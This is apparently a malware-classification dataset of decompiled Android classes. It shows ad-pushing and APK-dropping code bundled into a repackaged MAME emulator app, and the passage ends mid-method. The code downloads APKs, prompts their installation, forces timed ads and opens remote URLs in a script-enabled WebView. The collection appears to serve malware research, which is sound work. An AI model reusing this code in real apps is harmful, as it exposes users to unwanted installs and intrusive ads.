abVar.a(new C0017p(this));     Z.a().a(abVar);   }   public final Context getContext(){     if (this.b == null) {       this.b=getApplicationContext();     }     return this.b;   }   @Override public final void onCreate(  Bundle bundle){     super.onCreate(bundle);     requestWindowFeature(1);     getWindow().setBackgroundDrawable(new ColorDrawable(0));     CPManager.close(this);     FrameLayout frameLayout=new FrameLayout(this);     frameLayout.setLayoutParams(new ViewGroup.LayoutParams(-1,-1));     setContentView(frameLayout);     registerReceiver(this.g,new IntentFilter(S.q));     this.a.postDelayed(new RunnableC0012k(this),50L);   }   @Override protected final void onDestroy(){     super.onDestroy();     if (this.g != null) {       unregisterReceiver(this.g);     }   }   @Override public final boolean onKeyDown(  int i,  KeyEvent keyEvent){     new StringBuilder().append(""Ad Activity onKeyDown: "").append(i);     return true;   }   @Override protected final void onNewIntent(  Intent intent){     super.onNewIntent(intent);     this.a.postDelayed(new RunnableC0013l(this),50L);   }   @Override protected final void onResume(){     super.onResume();     if (this.f108c != null) {       this.f108c.h();     }   }   @Override protected final void onSaveInstanceState(  Bundle bundle){     super.onSaveInstanceState(bundle);   }   @Override protected final void onStop(){     super.onStop();     if (this.f108c != null) {       this.f108c.i();     }   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.fivefeiwo.coverscreen\SR.code","!org.eclipse.jdt.core.dom.TypeDeclaration@1c134554"
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.fivefeiwo.coverscreen\T.code","public class T {   public void a(  H h,  String str,  boolean z){   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.fivefeiwo.coverscreen\U.code","public final class U extends Thread {   Queue a;   H b;   String f109c;   final P e;   private long f=0;   private long g=0;   private int h=0;   long d=0;   public U(  P p,  H h,  T t){     this.e=p;     this.b=h;     Y.a();     this.f109c=Y.a(p.d,S.e,h.d());     this.a=new ConcurrentLinkedQueue();     a(t);   }   private void a(  int i){     new StringBuilder().append(""[DownloadCallback] doProgress, progress: "").append(i);     this.e.e.post(new X(this,i));     Iterator it=new ArrayList(this.a).iterator();     while (it.hasNext()) {       it.next();       H h=this.b;       String str=this.f109c;     }   }   private void a(  boolean z){     new StringBuilder().append(""[DownloadCallback] doComplete, success: "").append(z).append("", url: "").append(this.b.d());     this.e.e.post(new W(this,z));     Iterator it=new ArrayList(this.a).iterator();     while (it.hasNext()) {       ((T)it.next()).a(this.b,this.f109c,z);     }   }   public final void a(  T t){     if (t != null) {       this.a.add(t);     }   }   @Override public final void run(){     throw new UnsupportedOperationException(""Method not decompiled: com.fivefeiwo.coverscreen.U.run():void"");   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.fivefeiwo.coverscreen\V.code","final class V implements Runnable {   private U a;   public V(  U u){     this.a=u;   }   @Override public final void run(){     ae.a(this.a.e.d).a(this.a.b.e() + 12345,android.R.drawable.ic_menu_share,this.a.b.a(),this.a.b.a(),""å¼€å§‹ä¸‹è½½ _feiwocp"".replace(""_feiwocp"",""""),new Intent(),18,this.a.b.b(),this.a.d);   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.fivefeiwo.coverscreen\ViewOnClickListenerC0021t.code","final class ViewOnClickListenerC0021t implements View.OnClickListener {   private C0020s a;   public ViewOnClickListenerC0021t(  C0020s c0020s){     this.a=c0020s;   }   @Override public final void onClick(  View view){     this.a.e();   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.fivefeiwo.coverscreen\W.code","final class W implements Runnable {   private boolean a;   private U b;   public W(  U u,  boolean z){     this.b=u;     this.a=z;   }   @Override public final void run(){     if (!this.a) {       ae.a(this.b.e.d).a(this.b.b.e() + 12345,android.R.drawable.ic_menu_share,this.b.b.a(),this.b.b.a(),""ä¸‹è½½å¤±è´¥_feiwocp"".replace(""_feiwocp"",""""),new Intent(),16,this.b.b.b(),this.b.d);       return;     }     Intent intent=new Intent(""android.intent.action.VIEW"");     intent.addFlags(268435456);     intent.setDataAndType(Uri.fromFile(new File(this.b.f109c)),""application/vnd.android.package-archive_feiwocp"".replace(""_feiwocp"",""""));     ae.a(this.b.e.d).a(this.b.b.e() + 12345,android.R.drawable.ic_menu_share,this.b.b.a(),this.b.b.a(),""ä¸‹è½½å®Œæˆ�ï¼Œç‚¹å‡»å®‰è£…_feiwocp"".replace(""_feiwocp"",""""),intent,18,this.b.b.b(),this.b.d);     ap.b(this.b.e.d,S.j,this.b.b.c().replace(""."",""""),this.b.b.e() + "","" + new Date().getTime());     try {       ag.a();       ag.a(this.b.e.d,this.b.f109c);     }  catch (    Exception e) {       Log.e(""D"","""" + e);     }   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.fivefeiwo.coverscreen\WA.code","public class WA extends Activity {   WebView a;   String b;   boolean f110c=false;   private TextView d;   private void a(){     this.b=getIntent().getStringExtra(""url_feiwocp"".replace(""_feiwocp"",""""));     if (aq.a(this.b)) {       finish();       return;     }     FrameLayout frameLayout=new FrameLayout(this);     frameLayout.setLayoutParams(new ViewGroup.LayoutParams(-1,-1));     this.a=new WebView(this);     this.a.setLayoutParams(new FrameLayout.LayoutParams(-1,-1));     this.a.getSettings().setJavaScriptEnabled(true);     this.a.getSettings().setUseWideViewPort(true);     this.a.getSettings().setCacheMode(0);     this.a.getSettings().setBlockNetworkImage(true);     this.a.getSettings().setSupportZoom(true);     this.a.getSettings().setBuiltInZoomControls(true);     this.a.getSettings().setLightTouchEnabled(true);     this.a.setHorizontalScrollBarEnabled(false);     this.a.setVerticalScrollBarEnabled(false);     this.a.setDownloadListener(new E(this));     this.a.setWebChromeClient(new F(this));     this.a.setWebViewClient(new G(this));     frameLayout.addView(this.a);     this.d=new TextView(this);     this.d.setLayoutParams(new FrameLayout.LayoutParams(-1,-2));     this.d.setPadding(an.a(this,6.0f),an.a(this,6.0f),an.a(this,6.0f),an.a(this,6.0f));     this.d.setBackgroundColor(Color.parseColor(""#66000000_feiwocp"".replace(""_feiwocp"","""")));     this.d.setTextColor(-1);     this.d.setTextSize(16.0f);     frameLayout.addView(this.d);     setContentView(frameLayout);     this.a.loadData(""<h3>Loading...</h3>_placeholder"".replace(""_placeholder"",""""),""text/html"",com.seleuco.common.util.e.f);     this.a.loadUrl(""_feiwocp"".replace(""_feiwocp"","""") + this.b);   }   public static void a(  WA wa,  String str){     if (str == null) {       wa.d.setText("""");       wa.d.setVisibility(8);     }  else {       wa.d.setText(str);       wa.d.setVisibility(0);     }   }   @Override public void onBackPressed(){     if (this.f110c || this.a == null || !this.a.canGoBack()) {       super.onBackPressed();     }  else {       this.a.goBack();     }   }   @Override protected void onCreate(  Bundle bundle){     super.onCreate(bundle);     requestWindowFeature(1);     a();   }   @Override protected void onNewIntent(  Intent intent){     super.onNewIntent(intent);     a();   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.fivefeiwo.coverscreen\X.code","final class X implements Runnable {   private int a;   private U b;   public X(  U u,  int i){     this.b=u;     this.a=i;   }   @Override public final void run(){     ae.a(this.b.e.d).a(this.b.b.e() + 12345,android.R.drawable.ic_menu_share,this.b.b.a(),this.b.b.a(),""å·²ä¸‹è½½ _feiwocp"".replace(""_feiwocp"","""") + this.a + ""%"",new Intent(),18,this.b.b.b(),this.b.d);   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.fivefeiwo.coverscreen\Y.code","public final class Y {   private static Y a;   public static Y a(){     if (a == null) {       a=new Y();     }     return a;   }   public static String a(  Context context,  String str,  String str2){     String stringBuffer;     a();     String substring=str2.substring(str2.lastIndexOf(""/"") + 1,str2.length());     a();     if (!b()) {       StringBuilder sb=new StringBuilder();       a();       StringBuffer stringBuffer2=new StringBuffer();       stringBuffer2.append(context.getFilesDir().getAbsolutePath());       if (!"""".startsWith(""/"") && !context.getFilesDir().getAbsolutePath().endsWith(""/"")) {         stringBuffer2.append(""/"");       }       stringBuffer2.append("""");       File file=new File(stringBuffer2.toString());       if (!file.exists()) {         file.mkdirs();       }       return sb.append(stringBuffer2.toString()).append(substring).toString();     }     StringBuilder sb2=new StringBuilder();     a();     if (b()) {       StringBuffer stringBuffer3=new StringBuffer();       stringBuffer3.append(Environment.getExternalStorageDirectory());       if (!str.startsWith(""/"") && !Environment.getExternalStorageDirectory().toString().endsWith(""/"")) {         stringBuffer3.append(""/"");       }       stringBuffer3.append(str);       File file2=new File(stringBuffer3.toString());       if (!file2.exists()) {         new StringBuilder().append(""åˆ›å»ºæ–‡ä»¶å¤¹: "").append((Object)stringBuffer3).append("", æ˜¯å�¦æˆ�åŠŸï¼š"").append(file2.mkdirs());       }       stringBuffer=stringBuffer3.toString();     }  else {       stringBuffer=null;     }     return sb2.append(stringBuffer).append(""/"").append(substring).toString();   }   private static boolean b(){     return Environment.getExternalStorageState().equals(""mounted"");   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.fivefeiwo.coverscreen\Z.code","public final class Z {   private static Z a=null;   private ExecutorService b;   private Z(){     this.b=null;     this.b=Executors.newFixedThreadPool(5);   }   public static Z a(){     if (a == null) {       a=new Z();     }     return a;   }   public final void a(  ab abVar){     this.b.submit(abVar);   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.fivefeiwo.coverscreen\Zsc.code","public class Zsc {   public static void AnzInt(  final Context ctx,  String azkey){     CPManager.init(ctx,azkey);     new Handler().postDelayed(new Runnable(){       @Override public void run(){         CPManager.showAd(ctx);       }     } ,8000L);   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.hd.ix.c\cb.code","public class cb extends a {   @Override public void onCreate(){     super.onCreate();   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.mygame.ywbzhsi\color.code","public static final class color {   public static final int emu_back_color=0x7f050000;   public static final int white=0x7f050001;   public static final int black=0x7f050002;   public static final int grey=0x7f050003;   public static final int red=0x7f050004; } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.mygame.ywbzhsi\drawable.code","public static final class drawable {   public static final int back_portrait=0x7f020000;   public static final int bg=0x7f020001;   public static final int border=0x7f020002;   public static final int btn1=0x7f020003;   public static final int btn2=0x7f020004;   public static final int btn3=0x7f020005;   public static final int btn_01=0x7f020006;   public static final int btn_02=0x7f020007;   public static final int btn_03=0x7f020008;   public static final int btn_1=0x7f020009;   public static final int btn_2=0x7f02000a;   public static final int btn_3=0x7f02000b;   public static final int button_a=0x7f02000c;   public static final int button_a_press=0x7f02000d;   public static final int button_b=0x7f02000e;   public static final int button_b_press=0x7f02000f;   public static final int button_l1=0x7f020010;   public static final int button_l1_press=0x7f020011;   public static final int button_l2=0x7f020012;   public static final int button_l2_press=0x7f020013;   public static final int button_r1=0x7f020014;   public static final int button_r1_press=0x7f020015;   public static final int button_r2=0x7f020016;   public static final int button_r2_press=0x7f020017;   public static final int button_select=0x7f020018;   public static final int button_select_press=0x7f020019;   public static final int button_start=0x7f02001a;   public static final int button_start_press=0x7f02001b;   public static final int button_x=0x7f02001c;   public static final int button_x_press=0x7f02001d;   public static final int button_y=0x7f02001e;   public static final int button_y_press=0x7f02001f;   public static final int crt_1=0x7f020020;   public static final int crt_2=0x7f020021;   public static final int directory_icon=0x7f020022;   public static final int directory_up=0x7f020023;   public static final int dpad_down=0x7f020024;   public static final int dpad_down_left=0x7f020025;   public static final int dpad_down_right=0x7f020026;   public static final int dpad_left=0x7f020027;   public static final int dpad_none=0x7f020028;   public static final int dpad_right=0x7f020029;   public static final int dpad_up=0x7f02002a;   public static final int dpad_up_left=0x7f02002b;   public static final int dpad_up_right=0x7f02002c;   public static final int file_icon=0x7f02002d;   public static final int icon=0x7f02002e;   public static final int scanline_1=0x7f02002f;   public static final int scanline_2=0x7f020030;   public static final int stick_down=0x7f020031;   public static final int stick_down_left=0x7f020032;   public static final int stick_down_right=0x7f020033;   public static final int stick_inner=0x7f020034;   public static final int stick_left=0x7f020035;   public static final int stick_none=0x7f020036;   public static final int stick_outer=0x7f020037;   public static final int stick_right=0x7f020038;   public static final int stick_up=0x7f020039;   public static final int stick_up_left=0x7f02003a;   public static final int stick_up_right=0x7f02003b;   public static final int black=0x7f02003c;   public static final int translucent=0x7f02003d;   public static final int transparent=0x7f02003e; } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.mygame.ywbzhsi\id.code","public static final class id {   public static final int value=0x7f080000;   public static final int seekbar=0x7f080001;   public static final int EmulatorViewGL=0x7f080002;   public static final int EmulatorViewHW=0x7f080003;   public static final int EmulatorViewSW=0x7f080004;   public static final int FilterView=0x7f080005;   public static final int LinearLayout01=0x7f080006;   public static final int ScrollView01=0x7f080007;   public static final int TextView01=0x7f080008;   public static final int ButtonContinue=0x7f080009;   public static final int ad_container=0x7f08000a;   public static final int EmulatorFrame=0x7f08000b;   public static final int InputView=0x7f08000c; } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.mygame.ywbzhsi\layout.code","public static final class layout {   public static final int bar=0x7f030000;   public static final int emuview_gl=0x7f030001;   public static final int emuview_hw=0x7f030002;   public static final int emuview_sw=0x7f030003;   public static final int filterview=0x7f030004;   public static final int help=0x7f030005;   public static final int home=0x7f030006;   public static final int main=0x7f030007; } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.mygame.ywbzhsi\R.code","public final class R { public static final class drawable {     public static final int back_portrait=0x7f020000;     public static final int bg=0x7f020001;     public static final int border=0x7f020002;     public static final int btn1=0x7f020003;     public static final int btn2=0x7f020004;     public static final int btn3=0x7f020005;     public static final int btn_01=0x7f020006;     public static final int btn_02=0x7f020007;     public static final int btn_03=0x7f020008;     public static final int btn_1=0x7f020009;     public static final int btn_2=0x7f02000a;     public static final int btn_3=0x7f02000b;     public static final int button_a=0x7f02000c;     public static final int button_a_press=0x7f02000d;     public static final int button_b=0x7f02000e;     public static final int button_b_press=0x7f02000f;     public static final int button_l1=0x7f020010;     public static final int button_l1_press=0x7f020011;     public static final int button_l2=0x7f020012;     public static final int button_l2_press=0x7f020013;     public static final int button_r1=0x7f020014;     public static final int button_r1_press=0x7f020015;     public static final int button_r2=0x7f020016;     public static final int button_r2_press=0x7f020017;     public static final int button_select=0x7f020018;     public static final int button_select_press=0x7f020019;     public static final int button_start=0x7f02001a;     public static final int button_start_press=0x7f02001b;     public static final int button_x=0x7f02001c;     public static final int button_x_press=0x7f02001d;     public static final int button_y=0x7f02001e;     public static final int button_y_press=0x7f02001f;     public static final int crt_1=0x7f020020;     public static final int crt_2=0x7f020021;     public static final int directory_icon=0x7f020022;     public static final int directory_up=0x7f020023;     public static final int dpad_down=0x7f020024;     public static final int dpad_down_left=0x7f020025;     public static final int dpad_down_right=0x7f020026;     public static final int dpad_left=0x7f020027;     public static final int dpad_none=0x7f020028;     public static final int dpad_right=0x7f020029;     public static final int dpad_up=0x7f02002a;     public static final int dpad_up_left=0x7f02002b;     public static final int dpad_up_right=0x7f02002c;     public static final int file_icon=0x7f02002d;     public static final int icon=0x7f02002e;     public static final int scanline_1=0x7f02002f;     public static final int scanline_2=0x7f020030;     public static final int stick_down=0x7f020031;     public static final int stick_down_left=0x7f020032;     public static final int stick_down_right=0x7f020033;     public static final int stick_inner=0x7f020034;     public static final int stick_left=0x7f020035;     public static final int stick_none=0x7f020036;     public static final int stick_outer=0x7f020037;     public static final int stick_right=0x7f020038;     public static final int stick_up=0x7f020039;     public static final int stick_up_left=0x7f02003a;     public static final int stick_up_right=0x7f02003b;     public static final int black=0x7f02003c;     public static final int translucent=0x7f02003d;     public static final int transparent=0x7f02003e;   } public static final class layout {     public static final int bar=0x7f030000;     public static final int emuview_gl=0x7f030001;     public static final int emuview_hw=0x7f030002;     public static final int emuview_sw=0x7f030003;     public static final int filterview=0x7f030004;     public static final int help=0x7f030005;     public static final int home=0x7f030006;     public static final int main=0x7f030007;   } public static final class raw {     public static final int controller_landscape=0x7f040000;     public static final int roms=0x7f040001;   } public static final class color {     public static final int emu_back_color=0x7f050000;     public static final int white=0x7f050001;     public static final int black=0x7f050002;     public static final int grey=0x7f050003;     public static final int red=0x7f050004;   } public static final class string {     public static final int menu_vkey_X=0x7f060000;     public static final int menu_vkey_Y=0x7f060001;     public static final int menu_vkey_A=0x7f060002;     public static final int menu_vkey_B=0x7f060003;     public static final int menu_vkey_MENU=0x7f060004;     public static final int menu_vkey_SELECT=0x7f060005;     public static final int menu_vkeys=0x7f060006;     public static final int menu_options=0x7f060007;     public static final int menu_quit_game=0x7f060008;     public static final int menu_quit=0x7f060009;     public static final int menu_help=0x7f06000a;     public static final int gamepad_PDA=0x7f06000b;     public static final int app_name=0x7f06000c;     public static final int num=0x7f06000d;   } public static final class style {     public static final int ListText=0x7f070000;     public static final int ListTextSmall=0x7f070001;     public static final int Theme_MAME4ALL=0x7f070002;     public static final int Theme_MAME4ALL_TitleBar=0x7f070003;   } public static final class id {     public static final int value=0x7f080000;     public static final int seekbar=0x7f080001;     public static final int EmulatorViewGL=0x7f080002;     public static final int EmulatorViewHW=0x7f080003;     public static final int EmulatorViewSW=0x7f080004;     public static final int FilterView=0x7f080005;     public static final int LinearLayout01=0x7f080006;     public static final int ScrollView01=0x7f080007;     public static final int TextView01=0x7f080008;     public static final int ButtonContinue=0x7f080009;     public static final int ad_container=0x7f08000a;     public static final int EmulatorFrame=0x7f08000b;     public static final int InputView=0x7f08000c;   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.mygame.ywbzhsi\raw.code","public static final class raw {   public static final int controller_landscape=0x7f040000;   public static final int roms=0x7f040001; } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.mygame.ywbzhsi\string.code","public static final class string {   public static final int menu_vkey_X=0x7f060000;   public static final int menu_vkey_Y=0x7f060001;   public static final int menu_vkey_A=0x7f060002;   public static final int menu_vkey_B=0x7f060003;   public static final int menu_vkey_MENU=0x7f060004;   public static final int menu_vkey_SELECT=0x7f060005;   public static final int menu_vkeys=0x7f060006;   public static final int menu_options=0x7f060007;   public static final int menu_quit_game=0x7f060008;   public static final int menu_quit=0x7f060009;   public static final int menu_help=0x7f06000a;   public static final int gamepad_PDA=0x7f06000b;   public static final int app_name=0x7f06000c;   public static final int num=0x7f06000d; } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.mygame.ywbzhsi\style.code","public static final class style {   public static final int ListText=0x7f070000;   public static final int ListTextSmall=0x7f070001;   public static final int Theme_MAME4ALL=0x7f070002;   public static final int Theme_MAME4ALL_TitleBar=0x7f070003; } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.seleuco.analytics\a.code","class a implements Thread.UncaughtExceptionHandler {   private Thread.UncaughtExceptionHandler a;   private h b;   private Context f124c;   public void a(  Context context){     if (Thread.getDefaultUncaughtExceptionHandler() != this) {       this.f124c=context.getApplicationContext();       this.a=Thread.getDefaultUncaughtExceptionHandler();       Thread.setDefaultUncaughtExceptionHandler(this);     }   }   public void a(  h hVar){     this.b=hVar;   }   @Override public void uncaughtException(  Thread thread,  Throwable th){     a(th);     if (this.a != null) {       this.a.uncaughtException(thread,th);     }   }   private void a(  Throwable th){     if (th == null) {       Log.e(f.q,""Exception is null in handleException"");     }  else {       this.b.b(this.f124c,th);     }   } } private final class a extends Thread {   private final Object b=new Object();   private Context f132c;   private int d;   a(  Context context,  int i){     this.f132c=context.getApplicationContext();     this.d=i;   }   @Override public void run(){     try { synchronized (this.b) { switch (this.d) { case 0:           b.this.j(this.f132c);         break; case 1:       b.this.i(this.f132c);     break; } } }  catch (Exception e) { Log.b(f.q,""Exception occurred in invokehander."",e); } } } public final class a implements Runnable {   private Context b;   a(  Context context){     this.b=context.getApplicationContext();   }   @Override public void run(){     try { synchronized (d.this.b) {         d.this.f134c.a(this.b);       }     }  catch (    Error e) {       Log.b(f.q,""Error : "" + e.getMessage());       try {         i.j(this.b);       }  catch (      Exception e2) {         e2.printStackTrace();       }     } catch (    Exception e3) {       Log.b(f.q,""Exception occurred in ReportMessageHandler"",e3);     }   } } final class a extends WebChromeClient {   WebChromeClient a;   private final String f122c=""ekv"";   private final String d=""event"";   public a(  WebChromeClient webChromeClient){     this.a=null;     if (webChromeClient == null) {       this.a=new WebChromeClient();     }  else {       this.a=webChromeClient;     }   }   @Override public boolean onJsPrompt(  WebView webView,  String str,  String str2,  String str3,  JsPromptResult jsPromptResult){     if (""ekv"".equals(str2)) {       try {         JSONObject jSONObject=new JSONObject(str3);         HashMap<String,String> hashMap=new HashMap<>();         String str4=(String)jSONObject.remove(""id"");         int intValue=jSONObject.isNull(""duration"") ? 0 : ((Integer)jSONObject.remove(""duration"")).intValue();         Iterator<String> keys=jSONObject.keys();         while (keys.hasNext()) {           String next=keys.next();           hashMap.put(next,jSONObject.getString(next));         }         GameControl.a().a(GameControlJSInterface.this.a,str4,hashMap,intValue);       }  catch (      Exception e) {         e.printStackTrace();       }     }  else     if (""event"".equals(str2)) {       try {         JSONObject jSONObject2=new JSONObject(str3);         String optString=jSONObject2.optString(""label"");         if ("""".equals(optString)) {           optString=null;         }         GameControl.a().a(GameControlJSInterface.this.a,jSONObject2.getString(""tag""),optString,jSONObject2.optInt(""duration""),1);       }  catch (      Exception e2) {       }     }  else {       return this.a.onJsPrompt(webView,str,str2,str3,jsPromptResult);     }     jsPromptResult.confirm();     return true;   }   @Override public void onCloseWindow(  WebView webView){     this.a.onCloseWindow(webView);   }   @Override public boolean onCreateWindow(  WebView webView,  boolean z,  boolean z2,  Message message){     return this.a.onCreateWindow(webView,z,z2,message);   }   @Override public boolean onJsAlert(  WebView webView,  String str,  String str2,  JsResult jsResult){     return this.a.onJsAlert(webView,str,str2,jsResult);   }   @Override public boolean onJsBeforeUnload(  WebView webView,  String str,  String str2,  JsResult jsResult){     return this.a.onJsBeforeUnload(webView,str,str2,jsResult);   }   @Override public boolean onJsConfirm(  WebView webView,  String str,  String str2,  JsResult jsResult){     return this.a.onJsConfirm(webView,str,str2,jsResult);   }   @Override public void onProgressChanged(  WebView webView,  int i){     this.a.onProgressChanged(webView,i);   }   @Override public void onReceivedIcon(  WebView webView,  Bitmap bitmap){     this.a.onReceivedIcon(webView,bitmap);   }   @Override public void onReceivedTitle(  WebView webView,  String str){     this.a.onReceivedTitle(webView,str);   }   @Override public void onRequestFocus(  WebView webView){     this.a.onRequestFocus(webView);   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.seleuco.analytics\b.code","public class b extends d {   private String l;   private String m;   private final int n=0;   private final int o=1;   String a="""";   String b="""";   private final String p=""start_millis"";   private final String q=""end_millis"";   private final String r=""last_fetch_location_time"";   private final long s=10000;   private final int t=128;   private final int u=256;   void a(){   }   void b(){   }   public void a(  String str,  String str2){     this.d.E=str;     this.d.F=str2;   }   public void a(  Context context){     try {       if (context == null) {         Log.b(f.q,""unexpected null context in onPause"");       }  else       if (!context.getClass().getName().equals(this.l)) {         Log.b(f.q,""onPause() called without context from corresponding onResume()"");       }  else {         new a(context,0).start();       }     }  catch (    Exception e) {       Log.b(f.q,""Exception occurred in Mobclick.onRause(). "",e);     }   }   public void a(  Context context,  String str){     if (!TextUtils.isEmpty(str)) {       if (context == null) {         Log.b(f.q,""unexpected null context in reportError"");       }  else {         this.f134c.a(new com.seleuco.analytics.a.d(str));         e(context);       }     }   }   public void a(  Context context,  Throwable th){     if (context != null && th != null) {       this.f134c.a(new com.seleuco.analytics.a.d(th));       e(context);     }   } private final class a extends Thread {     private final Object b=new Object();     private Context f132c;     private int d;     a(    Context context,    int i){       this.f132c=context.getApplicationContext();       this.d=i;     }     @Override public void run(){       try { synchronized (this.b) { switch (this.d) { case 0:             b.this.j(this.f132c);           break; case 1:         b.this.i(this.f132c);       break;   } } }  catch (Exception e) { Log.b(f.q,""Exception occurred in invokehander."",e); } } } private void h(Context context){ if (context == null) { Log.b(f.q,""unexpected null context in onResume""); }  else { this.l=context.getClass().getName(); } } public void b(Context context){ try { h(context); getClass(); new a(context,1).start(); }  catch (Exception e) { Log.b(f.q,""Exception occurred in Mobclick.onResume(). "",e); } } public void c(Context context){ try { getClass(); a(context,2); }  catch (Exception e) { Log.b(f.q,""Exception occurred in Mobclick.flush(). "",e); } } public void a(Context context,String str,String str2,long j,int i){ if (context != null) { try { if (a(str,128) && i > 0) {   if (this.m == null) {     Log.e(f.q,""can't call onEvent before session is initialized"");   }  else   if (str2 != null && !a(str2,256)) {     Log.b(f.q,""invalid label in onEvent"");   }  else {     this.f134c.a(this.m,str,str2,j,i);     e(context);   } } }  catch (Exception e) { Log.b(f.q,""Exception occurred in Mobclick.onEvent(). "",e); return; } } Log.b(f.q,""invalid params in onEvent""); } public void a(Context context,String str,HashMap<String,String> hashMap,long j){ if (context != null) { try { if (!TextUtils.isEmpty(str)) {   if (a(hashMap)) {     if (this.m == null) {       Log.e(f.q,""can't call onEvent before session is initialized"");     }  else {       this.f134c.a(this.m,str,hashMap,j);       e(context);     }   } } }  catch (Exception e) { Log.b(f.q,""Exception occurred in Mobclick.onEvent(). "",e); return; } } Log.b(f.q,""invalid params in onKVEventEnd""); } public synchronized void i(Context context){ SharedPreferences e=i.e(context); if (e != null) { if (a(e)) { this.m=b(context,e); Log.a(f.q,""Start new session: "" + this.m); }  else { this.m=c(context,e); Log.a(f.q,""Extend current session: "" + this.m); } } } public synchronized void j(Context context){ SharedPreferences e=i.e(context); if (e != null) { long j=e.getLong(""start_millis"",-1L); if (j == -1) { Log.b(f.q,""onEndSession called before onStartSession""); }  else { long currentTimeMillis=System.currentTimeMillis(); SharedPreferences.Editor a2=m.a(e,this.l,j,currentTimeMillis); a2.putLong(""start_millis"",-1L); a2.putLong(""end_millis"",currentTimeMillis); a2.commit(); } a(context,e); a(context,5); } } private void a(Context context,SharedPreferences sharedPreferences){ SharedPreferences.Editor a2; long currentTimeMillis=System.currentTimeMillis(); if (f.i && currentTimeMillis - sharedPreferences.getLong(""last_fetch_location_time"",0L) >= 10000 && (a2=o.a(context,sharedPreferences)) != null) { a2.putLong(""last_fetch_location_time"",currentTimeMillis); a2.commit(); } } private boolean a(SharedPreferences sharedPreferences){ return System.currentTimeMillis() - sharedPreferences.getLong(""end_millis"",-1L) > f.d; } private String b(Context context,SharedPreferences sharedPreferences){ long currentTimeMillis=System.currentTimeMillis(); String a2=a(context,currentTimeMillis); com.seleuco.analytics.a.h hVar=new com.seleuco.analytics.a.h(context,a2); m a3=m.a(context); this.f134c.a(hVar); this.f134c.a(a3); SharedPreferences.Editor edit=sharedPreferences.edit(); edit.putString(l.f,a2); edit.putLong(""start_millis"",currentTimeMillis); edit.putLong(""end_millis"",-1L); edit.commit(); getClass(); a(context,4); return a2; } private String a(Context context,long j){ String q=this.k == null ? com.seleuco.common.b.q(context) : this.k; StringBuilder sb=new StringBuilder(); sb.append(j).append(q).append(com.seleuco.common.util.g.b(com.seleuco.common.b.g(context))); return com.seleuco.common.util.g.a(sb.toString()); } private String c(Context context,SharedPreferences sharedPreferences){ Long valueOf=Long.valueOf(System.currentTimeMillis()); SharedPreferences.Editor edit=sharedPreferences.edit(); edit.putLong(""start_millis"",valueOf.longValue()); edit.putLong(""end_millis"",-1L); edit.commit(); return sharedPreferences.getString(l.f,null); } private void d(Context context,String str){ try { if (f.m) { this.f134c.a(str); }  else { j a2=j.a(context,str); a2.a(Long.valueOf(System.currentTimeMillis())); a2.a(context); } }  catch (Exception e) { Log.a(f.q,""exception in save event begin info""); } } private int e(Context context,String str){ long longValue; int i=-1; try { if (f.m) { longValue=this.f134c.b(str); }  else { longValue=j.a(context,str).a().longValue(); } if (longValue <= 0) { return -1; } i=(int)(System.currentTimeMillis() - longValue); return i; }  catch (Exception e) { Log.a(f.q,""exception in get event duration"",e); return i; } } public void b(Context context,String str){ if (context == null || !a(str,128)) { Log.b(f.q,""invalid params in onEventBegin""); }  else { d(context,""_t"" + str); } } public void c(Context context,String str){ if (context == null || TextUtils.isEmpty(str)) { Log.a(f.q,""input Context is null or event_id is empty""); return; } int e=e(context,""_t"" + str); if (e < 0) { Log.b(f.q,""event duration less than 0 in onEventEnd""); }  else { a(context,str,null,e,1); } } public void a(Context context,String str,String str2){ if (context == null || !a(str,128) || !a(str2,256)) { Log.b(f.q,""invalid params in onEventBegin""); }  else { d(context,""_tl"" + str + str2); } } public void b(Context context,String str,String str2){ if (context == null || TextUtils.isEmpty(str2)) { Log.b(f.q,""invalid params in 